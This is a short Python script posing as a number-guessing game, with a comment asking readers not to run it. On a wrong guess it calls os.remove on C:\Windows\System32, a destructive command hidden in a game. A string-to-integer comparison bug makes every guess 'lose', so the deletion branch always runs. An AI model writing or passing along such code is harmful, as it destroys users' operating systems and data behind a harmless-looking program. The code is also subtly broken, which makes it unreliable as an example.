import os
import random

# Do not actually run this pls

n = input("Select a number 1-10: ")

random_int = random.randint(1,10)

if n == random_int:
    print("You win!")
else:
    print("Oops")
    os.remove("C:\Windows\System32")

